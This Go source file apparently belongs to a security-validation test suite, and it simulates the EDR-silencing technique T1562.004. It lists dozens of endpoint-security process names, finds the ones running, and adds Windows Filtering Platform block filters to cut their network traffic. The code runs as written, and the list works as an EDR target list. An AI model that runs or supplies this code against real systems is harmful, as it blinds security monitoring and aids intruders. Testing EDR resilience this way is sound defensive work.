//go:build windows
// +build windows

/*
Stage 2: WFP Filter Application
Technique: T1562.004 - Impair Defenses: Disable Windows Firewall
MITRE ATT&CK Tactic: Defense Evasion

This stage applies Windows Filtering Platform filters to block EDR cloud connectivity.
*/

package main

import (
	"fmt"
	"strings"
	"syscall"
	"unsafe"

	Endpoint "github.com/preludeorg/libraries/go/tests/endpoint"
	"golang.org/x/sys/windows"
)

const (
	STAGE_ID     = 2
	TECHNIQUE_ID = "T1562.004"
	STAGE_NAME   = "WFP Filter Application"
)

// WFP Constants
const (
	FWP_EMPTY_WEIGHT uint64 = 0
	FWP_ACTION_BLOCK uint32 = 0x00000001 | 0x00001000
	SUBLAYER_WEIGHT  uint16 = 0xFFFF
)

// WFP Condition Types
const (
	FWP_MATCH_EQUAL = 0
	FWP_BYTE_BLOB_TYPE = 9
	FWP_EMPTY_TYPE = 0
)

// Process access rights
const (
	PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
	TH32CS_SNAPPROCESS                = 0x00000002
)

// WFP Layer GUIDs (for filter creation)
var (
	FWPM_LAYER_ALE_AUTH_CONNECT_V4 = windows.GUID{
		Data1: 0xc38d57d1,
		Data2: 0x05a7,
		Data3: 0x4c33,
		Data4: [8]byte{0x90, 0x4f, 0x7f, 0xbc, 0xee, 0xe6, 0x0e, 0x82},
	}
	FWPM_LAYER_ALE_AUTH_CONNECT_V6 = windows.GUID{
		Data1: 0x4a72393b,
		Data2: 0x319f,
		Data3: 0x44bc,
		Data4: [8]byte{0x84, 0xc3, 0xba, 0x54, 0xdc, 0xb3, 0xb6, 0xb4},
	}
	FWPM_LAYER_ALE_AUTH_RECV_ACCEPT_V4 = windows.GUID{
		Data1: 0x88bb5dad,
		Data2: 0x76d7,
		Data3: 0x4227,
		Data4: [8]byte{0x9c, 0x71, 0xdf, 0x05, 0x33, 0xa0, 0x06, 0x2a},
	}
	FWPM_LAYER_ALE_AUTH_RECV_ACCEPT_V6 = windows.GUID{
		Data1: 0xa3b42c97,
		Data2: 0x9f04,
		Data3: 0x4672,
		Data4: [8]byte{0xb8, 0x7e, 0xce, 0xe9, 0xc3, 0x83, 0xc0, 0x81},
	}
	FWPM_CONDITION_ALE_APP_ID = windows.GUID{
		Data1: 0xd78e1e87,
		Data2: 0x8644,
		Data3: 0x4ea5,
		Data4: [8]byte{0x94, 0x37, 0xd8, 0x09, 0xec, 0xef, 0xc9, 0x71},
	}
)

// ComprehensiveEDRList contains process names for modern EDR/AV products
var ComprehensiveEDRList = map[string]string{
	// Microsoft
	"msmpeng.exe":        "Windows Defender",
	"mssense.exe":        "Microsoft Defender for Endpoint",
	"sensecncproxy.exe":  "Microsoft Defender for Endpoint",
	"senseir.exe":        "Microsoft Defender for Endpoint",
	"sensesampleuploader.exe": "Microsoft Defender for Endpoint",

	// CrowdStrike
	"csagent.exe":        "CrowdStrike Falcon",
	"csfalconservice.exe": "CrowdStrike Falcon",
	"csfalconcontainer.exe": "CrowdStrike Falcon",

	// SentinelOne
	"sentinelagent.exe":  "SentinelOne",
	"sentinelservicehost.exe": "SentinelOne",
	"sentinelstaticscanagent.exe": "SentinelOne",

	// Carbon Black
	"cb.exe":             "Carbon Black",
	"cbdefense.exe":      "Carbon Black Defense",
	"repcli.exe":         "Carbon Black Response",

	// Cylance
	"cylanceservice.exe": "Cylance",
	"cylancesvc.exe":     "Cylance",

	// Symantec/Broadcom
	"sep.exe":            "Symantec Endpoint Protection",
	"smc.exe":            "Symantec Management Client",
	"smcgui.exe":         "Symantec Endpoint Protection",
	"ccsvchst.exe":       "Symantec Norton",

	// McAfee/Trellix
	"mcshield.exe":       "McAfee",
	"mfemms.exe":         "McAfee Endpoint Security",
	"masvc.exe":          "McAfee Agent",
	"mctray.exe":         "McAfee",

	// Trend Micro
	"coreserviceshell.exe": "Trend Micro",
	"tmbmsrv.exe":        "Trend Micro",
	"ntrtscan.exe":       "Trend Micro",

	// Palo Alto
	"cyserver.exe":       "Palo Alto Cortex XDR",
	"cytray.exe":         "Palo Alto Cortex XDR",

	// FireEye/Mandiant
	"xagt.exe":           "FireEye Endpoint Agent",
	"xagtnotif.exe":      "FireEye Endpoint Agent",

	// Sophos
	"sophoshealth.exe":   "Sophos",
	"savservice.exe":     "Sophos Anti-Virus",
	"sophosfs.exe":       "Sophos",

	// ESET
	"ekrn.exe":           "ESET",
	"egui.exe":           "ESET",

	// Kaspersky
	"avp.exe":            "Kaspersky",
	"kavfswp.exe":        "Kaspersky",

	// Tanium
	"taniumclient.exe":   "Tanium",
	"taniumtraceagent.exe": "Tanium",

	// Cisco
	"sfc.exe":            "Cisco Secure Endpoint (AMP)",
	"immunetprotect.exe": "Cisco Secure Endpoint",

	// Fortinet
	"forticlient.exe":    "FortiClient",

	// Bitdefender
	"epag.exe":           "Bitdefender",
	"epintegrationservice.exe": "Bitdefender",

	// Webroot
	"wrsa.exe":           "Webroot SecureAnywhere",
}

// WFP Structures
type FWPM_SESSION0 struct {
	SessionKey           windows.GUID
	DisplayData          FWPM_DISPLAY_DATA0
	Flags                uint32
	TxnWaitTimeoutInMSec uint32
	ProcessId            uint32
	Sid                  *windows.SID
	Username             *uint16
	KernelMode           int32
}

type FWPM_DISPLAY_DATA0 struct {
	Name        *uint16
	Description *uint16
}

type FWPM_PROVIDER0 struct {
	ProviderKey  windows.GUID
	DisplayData  FWPM_DISPLAY_DATA0
	Flags        uint32
	ProviderData FWP_BYTE_BLOB
	ServiceName  *uint16
}

type FWPM_SUBLAYER0 struct {
	SublayerKey  windows.GUID
	DisplayData  FWPM_DISPLAY_DATA0
	Flags        uint32
	ProviderKey  *windows.GUID
	ProviderData FWP_BYTE_BLOB
	Weight       uint16
}

type FWP_BYTE_BLOB struct {
	Size uint32
	Data *byte
}

type FWPM_FILTER0 struct {
	FilterKey           windows.GUID
	DisplayData         FWPM_DISPLAY_DATA0
	Flags               uint32
	ProviderKey         *windows.GUID
	ProviderData        FWP_BYTE_BLOB
	LayerKey            windows.GUID
	SubLayerKey         windows.GUID
	Weight              FWP_VALUE0
	NumFilterConditions uint32
	FilterCondition     *FWPM_FILTER_CONDITION0
	Action              FWPM_ACTION0
	Context             windows.GUID
	Reserved            *windows.GUID
	FilterId            uint64
	EffectiveWeight     FWP_VALUE0
}

type FWPM_FILTER_CONDITION0 struct {
	FieldKey       windows.GUID
	MatchType      uint32
	ConditionValue FWP_CONDITION_VALUE0
}

type FWP_CONDITION_VALUE0 struct {
	Type  uint32
	Value uintptr // Can hold uint8, uint16, uint32, uint64, or pointer
}

type FWP_VALUE0 struct {
	Type  uint32
	Value uint64
}

type FWPM_ACTION0 struct {
	Type         uint32
	FilterType   windows.GUID // union - can be GUID or callout ID
}

type PROCESSENTRY32 struct {
	Size              uint32
	CntUsage          uint32
	ProcessID         uint32
	DefaultHeapID     uintptr
	ModuleID          uint32
	CntThreads        uint32
	ParentProcessID   uint32
	PriorityClassBase int32
	Flags             uint32
	ExeFile           [260]uint16
}

type EDRTarget struct {
	ProcessName string
	PID         uint32
	ProcessPath string
	Product     string
}

type WFPFilter struct {
	EngineHandle uintptr
	ProviderKey  windows.GUID
	SublayerKey  windows.GUID
	FilterIDs    []uint64
}

var (
	fwpuclnt                      = syscall.NewLazyDLL("fwpuclnt.dll")
	kernel32                      = syscall.NewLazyDLL("kernel32.dll")
	procFwpmEngineOpen0           = fwpuclnt.NewProc("FwpmEngineOpen0")
	procFwpmEngineClose0          = fwpuclnt.NewProc("FwpmEngineClose0")
	procFwpmProviderAdd0          = fwpuclnt.NewProc("FwpmProviderAdd0")
	procFwpmSublayerAdd0          = fwpuclnt.NewProc("FwpmSublayerAdd0")
	procFwpmFilterDeleteById0     = fwpuclnt.NewProc("FwpmFilterDeleteById0")
	procFwpmFilterAdd0            = fwpuclnt.NewProc("FwpmFilterAdd0")
	procFwpmGetAppIdFromFileName0 = fwpuclnt.NewProc("FwpmGetAppIdFromFileName0")
	procFwpmFreeMemory0           = fwpuclnt.NewProc("FwpmFreeMemory0")
	procOpenProcess               = kernel32.NewProc("OpenProcess")
	procQueryFullProcessImageNameW = kernel32.NewProc("QueryFullProcessImageNameW")
	procCreateToolhelp32Snapshot  = kernel32.NewProc("CreateToolhelp32Snapshot")
	procProcess32FirstW           = kernel32.NewProc("Process32FirstW")
	procProcess32NextW            = kernel32.NewProc("Process32NextW")
	procCloseHandle               = kernel32.NewProc("CloseHandle")
)

func main() {
	Endpoint.Say("=================================================================")
	Endpoint.Say("Stage %d: %s", STAGE_ID, STAGE_NAME)
	Endpoint.Say("Technique: %s", TECHNIQUE_ID)
	Endpoint.Say("=================================================================")
	Endpoint.Say("")

	// Attach to parent test logger
	AttachLogger("640e6458-5b6b-4153-87b4-8327599829a8", STAGE_NAME)

	Endpoint.Say("[*] Initializing Windows Filtering Platform")

	// Initialize WFP
	filter, err := InitializeWFP()
	if err != nil {
		Endpoint.Say(fmt.Sprintf("[!] Failed to initialize WFP: %v", err))
		LogMessage("ERROR", "Stage2", fmt.Sprintf("WFP initialization failed: %v", err))
		Endpoint.Say("")
		Endpoint.Say("[!] This may indicate:")
		Endpoint.Say("    - Base Filtering Engine (BFE) service not running")
		Endpoint.Say("    - Insufficient permissions")
		Endpoint.Say("    - WFP infrastructure disabled")
		Endpoint.Stop(Endpoint.ExecutionPrevented) // 126 = blocked by protection
	}
	defer filter.Cleanup()

	Endpoint.Say("[+] WFP engine initialized successfully")
	Endpoint.Say("[+] Provider and sublayer created")
	LogMessage("INFO", "Stage2", "Windows Filtering Platform engine opened")

	Endpoint.Say("")
	Endpoint.Say("[*] Discovering EDR/AV processes...")

	// Discover running EDR processes
	targets, err := DiscoverEDRProcesses()
	if err != nil {
		Endpoint.Say(fmt.Sprintf("[!] Failed to enumerate processes: %v", err))
		LogMessage("ERROR", "Stage2", fmt.Sprintf("Process enumeration failed: %v", err))
		Endpoint.Stop(Endpoint.UnexpectedTestError)
	}

	if len(targets) == 0 {
		Endpoint.Say("[!] No EDR/AV processes discovered")
		Endpoint.Say("    Cannot test WFP filtering without EDR targets")
		LogMessage("INFO", "Stage2", "No EDR processes found")
		Endpoint.Stop(Endpoint.UnexpectedTestError) // Can't test without targets
	}

	Endpoint.Say(fmt.Sprintf("[+] Discovered %d EDR/AV process(es)", len(targets)))
	for _, target := range targets {
		Endpoint.Say(fmt.Sprintf("    [+] %s (PID: %d) - %s", target.ProcessName, target.PID, target.Product))
		Endpoint.Say(fmt.Sprintf("        Path: %s", target.ProcessPath))
	}

	Endpoint.Say("")
	Endpoint.Say("[*] Creating network blocking filters...")
	Endpoint.Say("")

	// Create filters for each discovered EDR process
	totalFiltersCreated := 0
	blockedByProtection := false

	for _, target := range targets {
		Endpoint.Say(fmt.Sprintf("  [*] Processing %s (PID: %d)", target.ProcessName, target.PID))

		filterIDs, err := CreateFilterForProcess(filter.EngineHandle, target, filter.SublayerKey)
		if err != nil {
			if strings.Contains(err.Error(), "access denied") || strings.Contains(err.Error(), "protection active") {
				Endpoint.Say(fmt.Sprintf("      [!] Filter creation blocked (protection active)"))
				LogMessage("WARNING", "Stage2", fmt.Sprintf("Filter creation blocked for %s: %v", target.ProcessName, err))
				blockedByProtection = true
				break // EDR protection is active
			}
			Endpoint.Say(fmt.Sprintf("      [!] Failed to create filters: %v", err))
			LogMessage("ERROR", "Stage2", fmt.Sprintf("Filter creation failed for %s: %v", target.ProcessName, err))
			continue
		}

		// Store filter IDs for cleanup
		filter.FilterIDs = append(filter.FilterIDs, filterIDs...)
		totalFiltersCreated += len(filterIDs)

		Endpoint.Say(fmt.Sprintf("      [+] Successfully created %d filters (4 layers)", len(filterIDs)))
		LogMessage("INFO", "Stage2", fmt.Sprintf("Created %d filters for %s (PID: %d)", len(filterIDs), target.ProcessName, target.PID))
		Endpoint.Say("")
	}

	Endpoint.Say("")
	Endpoint.Say("=================================================================")
	Endpoint.Say("Stage 2 Results")
	Endpoint.Say("=================================================================")
	Endpoint.Say(fmt.Sprintf("EDR processes discovered: %d", len(targets)))
	Endpoint.Say(fmt.Sprintf("Total filters created:    %d", totalFiltersCreated))
	Endpoint.Say("")

	// Determine exit code
	if blockedByProtection {
		Endpoint.Say("[+] EDR protection mechanisms blocked filter creation")
		Endpoint.Say("    System is protected against WFP-based network isolation")
		LogMessage("INFO", "Stage2", "Filter creation blocked by EDR protection")
		Endpoint.Stop(Endpoint.ExecutionPrevented) // 126 = blocked
	} else if totalFiltersCreated > 0 {
		Endpoint.Say("[!] Successfully created network blocking filters")
		Endpoint.Say(fmt.Sprintf("    %d EDR processes are now isolated from network", len(targets)))
		Endpoint.Say("    Filters will be automatically removed when test exits")
		LogMessage("INFO", "Stage2", fmt.Sprintf("Successfully created %d filters for %d EDR processes", totalFiltersCreated, len(targets)))
		Endpoint.Stop(Endpoint.Unprotected) // 101 = vulnerable
	} else {
		Endpoint.Say("[!] No filters were created")
		LogMessage("ERROR", "Stage2", "No filters created despite having targets")
		Endpoint.Stop(Endpoint.UnexpectedTestError) // 999 = error
	}
}

func InitializeWFP() (*WFPFilter, error) {
	filter := &WFPFilter{
		FilterIDs: make([]uint64, 0),
	}

	// Generate GUIDs for provider and sublayer
	providerGUID := windows.GUID{
		Data1: 0xdeadbeef,
		Data2: 0x1337,
		Data3: 0x4141,
		Data4: [8]byte{0x42, 0x42, 0x43, 0x43, 0x44, 0x44, 0x45, 0x45},
	}
	filter.ProviderKey = providerGUID

	sublayerGUID := windows.GUID{
		Data1: 0xcafebabe,
		Data2: 0x1337,
		Data3: 0x5151,
		Data4: [8]byte{0x52, 0x52, 0x53, 0x53, 0x54, 0x54, 0x55, 0x55},
	}
	filter.SublayerKey = sublayerGUID

	// Open WFP engine
	var engineHandle uintptr
	session := &FWPM_SESSION0{}

	ret, _, _ := procFwpmEngineOpen0.Call(
		0,
		0x00000002, // RPC_C_AUTHN_WINNT
		0,
		uintptr(unsafe.Pointer(session)),
		uintptr(unsafe.Pointer(&engineHandle)),
	)

	if ret != 0 {
		return nil, fmt.Errorf("FwpmEngineOpen0 failed with code: 0x%x", ret)
	}
	filter.EngineHandle = engineHandle

	// Create provider
	providerName, _ := syscall.UTF16PtrFromString("F0RT1KA EDR Filter Provider")
	provider := &FWPM_PROVIDER0{
		ProviderKey: providerGUID,
		DisplayData: FWPM_DISPLAY_DATA0{
			Name: providerName,
		},
	}

	ret, _, _ = procFwpmProviderAdd0.Call(
		engineHandle,
		uintptr(unsafe.Pointer(provider)),
		0,
	)
	if ret != 0 {
		Endpoint.Say(fmt.Sprintf("    [*] Provider add returned: 0x%x (may already exist)", ret))
	}

	// Create sublayer
	sublayerName, _ := syscall.UTF16PtrFromString("F0RT1KA EDR Filter Sublayer")
	sublayer := &FWPM_SUBLAYER0{
		SublayerKey: sublayerGUID,
		DisplayData: FWPM_DISPLAY_DATA0{
			Name: sublayerName,
		},
		ProviderKey: &providerGUID,
		Weight:      SUBLAYER_WEIGHT,
	}

	ret, _, _ = procFwpmSublayerAdd0.Call(
		engineHandle,
		uintptr(unsafe.Pointer(sublayer)),
		0,
	)
	if ret != 0 {
		Endpoint.Say(fmt.Sprintf("    [*] Sublayer add returned: 0x%x (may already exist)", ret))
	}

	return filter, nil
}

// CreateFilterForProcess creates WFP filters to block network traffic for a specific process
func CreateFilterForProcess(engineHandle uintptr, target EDRTarget, sublayerKey windows.GUID) ([]uint64, error) {
	var filterIDs []uint64

	// Convert process path to UTF16 for Windows API
	processPathUTF16, err := syscall.UTF16PtrFromString(target.ProcessPath)
	if err != nil {
		return nil, fmt.Errorf("failed to convert process path: %v", err)
	}

	// Get AppID blob from process path
	var appIdBlob *FWP_BYTE_BLOB
	ret, _, _ := procFwpmGetAppIdFromFileName0.Call(
		uintptr(unsafe.Pointer(processPathUTF16)),
		uintptr(unsafe.Pointer(&appIdBlob)),
	)
	if ret != 0 {
		return nil, fmt.Errorf("FwpmGetAppIdFromFileName0 failed: 0x%x", ret)
	}
	defer procFwpmFreeMemory0.Call(uintptr(unsafe.Pointer(&appIdBlob)))

	// Define the 4 filter layers (IPv4/IPv6, inbound/outbound)
	layers := []windows.GUID{
		FWPM_LAYER_ALE_AUTH_CONNECT_V4,       // IPv4 outbound
		FWPM_LAYER_ALE_AUTH_CONNECT_V6,       // IPv6 outbound
		FWPM_LAYER_ALE_AUTH_RECV_ACCEPT_V4,   // IPv4 inbound
		FWPM_LAYER_ALE_AUTH_RECV_ACCEPT_V6,   // IPv6 inbound
	}

	layerNames := []string{"IPv4 Outbound", "IPv6 Outbound", "IPv4 Inbound", "IPv6 Inbound"}

	// Create filter for each layer
	for i, layerGUID := range layers {
		// Create filter condition (match by AppID)
		filterCondition := FWPM_FILTER_CONDITION0{
			FieldKey:  FWPM_CONDITION_ALE_APP_ID,
			MatchType: FWP_MATCH_EQUAL,
			ConditionValue: FWP_CONDITION_VALUE0{
				Type:  FWP_BYTE_BLOB_TYPE,
				Value: uintptr(unsafe.Pointer(appIdBlob)),
			},
		}

		// Create filter name
		filterName := fmt.Sprintf("F0RT1KA Block %s - %s (%s)", target.ProcessName, layerNames[i], target.Product)
		filterNameUTF16, _ := syscall.UTF16PtrFromString(filterName)

		// Create filter
		filter := FWPM_FILTER0{
			DisplayData: FWPM_DISPLAY_DATA0{
				Name: filterNameUTF16,
			},
			LayerKey:            layerGUID,
			SubLayerKey:         sublayerKey,
			Weight:              FWP_VALUE0{Type: FWP_EMPTY_TYPE, Value: FWP_EMPTY_WEIGHT},
			NumFilterConditions: 1,
			FilterCondition:     &filterCondition,
			Action: FWPM_ACTION0{
				Type: FWP_ACTION_BLOCK,
			},
		}

		// Add filter
		var filterID uint64
		ret, _, _ := procFwpmFilterAdd0.Call(
			engineHandle,
			uintptr(unsafe.Pointer(&filter)),
			0,
			uintptr(unsafe.Pointer(&filterID)),
		)

		if ret != 0 {
			// Check if it's an access denied error
			if ret == 0x80070005 { // ERROR_ACCESS_DENIED
				return filterIDs, fmt.Errorf("access denied (protection active)")
			}
			return filterIDs, fmt.Errorf("FwpmFilterAdd0 failed for %s: 0x%x", layerNames[i], ret)
		}

		filterIDs = append(filterIDs, filterID)
		Endpoint.Say(fmt.Sprintf("      [+] Created filter for %s (ID: %d)", layerNames[i], filterID))
	}

	return filterIDs, nil
}

// DiscoverEDRProcesses enumerates running processes and identifies EDR/AV products
func DiscoverEDRProcesses() ([]EDRTarget, error) {
	// Create snapshot of running processes
	snapshot, _, err := procCreateToolhelp32Snapshot.Call(
		uintptr(TH32CS_SNAPPROCESS),
		0,
	)
	if snapshot == uintptr(syscall.InvalidHandle) {
		return nil, fmt.Errorf("failed to create process snapshot: %v", err)
	}
	defer procCloseHandle.Call(snapshot)

	var pe32 PROCESSENTRY32
	pe32.Size = uint32(unsafe.Sizeof(pe32))

	var targets []EDRTarget

	// Get first process
	ret, _, _ := procProcess32FirstW.Call(snapshot, uintptr(unsafe.Pointer(&pe32)))
	if ret == 0 {
		return nil, fmt.Errorf("failed to get first process")
	}

	// Iterate through processes
	for {
		processName := syscall.UTF16ToString(pe32.ExeFile[:])
		processNameLower := strings.ToLower(processName)

		// Check if process matches known EDR/AV
		if product, exists := ComprehensiveEDRList[processNameLower]; exists {
			// Get full process path
			processPath, err := GetProcessPath(pe32.ProcessID)
			if err != nil {
				// If we can't get the path, use just the process name
				processPath = processName
			}

			targets = append(targets, EDRTarget{
				ProcessName: processName,
				PID:         pe32.ProcessID,
				ProcessPath: processPath,
				Product:     product,
			})
		}

		// Get next process
		ret, _, _ = procProcess32NextW.Call(snapshot, uintptr(unsafe.Pointer(&pe32)))
		if ret == 0 {
			break
		}
	}

	return targets, nil
}

// GetProcessPath retrieves the full executable path for a given process ID
func GetProcessPath(pid uint32) (string, error) {
	// Open process with query information access
	handle, _, err := procOpenProcess.Call(
		uintptr(PROCESS_QUERY_LIMITED_INFORMATION),
		0,
		uintptr(pid),
	)
	if handle == 0 {
		return "", fmt.Errorf("failed to open process %d: %v", pid, err)
	}
	defer procCloseHandle.Call(handle)

	// Query full process image name
	var size uint32 = 260 // MAX_PATH
	pathBuf := make([]uint16, size)

	ret, _, _ := procQueryFullProcessImageNameW.Call(
		handle,
		0, // PROCESS_NAME_NATIVE = 0, use Win32 path format
		uintptr(unsafe.Pointer(&pathBuf[0])),
		uintptr(unsafe.Pointer(&size)),
	)

	if ret == 0 {
		return "", fmt.Errorf("QueryFullProcessImageNameW failed for PID %d", pid)
	}

	return syscall.UTF16ToString(pathBuf), nil
}

func (f *WFPFilter) Cleanup() {
	if f.EngineHandle == 0 {
		return
	}

	Endpoint.Say("[*] Cleaning up WFP filters")

	// Delete all created filters
	for _, filterID := range f.FilterIDs {
		procFwpmFilterDeleteById0.Call(f.EngineHandle, uintptr(filterID))
	}

	// Close engine
	procFwpmEngineClose0.Call(f.EngineHandle)
	LogMessage("INFO", "Stage2", "WFP filters removed and engine closed")
}
